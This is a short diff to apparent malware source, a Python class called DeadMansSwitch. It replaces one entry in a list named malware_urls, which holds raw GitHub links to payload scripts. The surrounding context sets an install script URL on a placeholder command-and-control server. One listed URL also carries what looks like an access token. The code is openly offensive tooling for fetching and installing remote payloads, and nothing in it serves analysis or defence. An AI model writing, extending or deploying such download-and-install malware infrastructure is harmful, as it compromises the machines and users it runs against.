@@ -477,7 +477,7 @@ class DeadMansSwitch:
         self.malware_urls = [
             "https://raw.githubusercontent.com/ywwgbdqjmdad-ux/fantastic-octo-meme/refs/heads/main/deepseek_python_20251123_1133b4_READABLE.py?token=GHSAT0AAAAAADKJL6E6LD7ANFQT7YSIBXHE2K62Z2A",
             "https://raw.githubusercontent.com/nuojjijia/ubiquitous-succotasha2123456/refs/heads/main/deepseek_python_20251123_1133b4%20-%20Copy.py",
-            "https://raw.githubusercontent.com/shadow788878/ubiquitous-tribble1234567/refs/heads/main/deepseek_python_20251123_1133b4%20-%20Copy.py"
+            "https://raw.githubusercontent.com/ywwgbdqjmdad-ux/special-octo-computing-machines3wed4r5gt6hy78uj9/refs/heads/main/deepseek_python_20251123_1133b4_READABLE.py"
         ]
         
         self.install_script_url = "https://your-c2-server.com/install.sh"
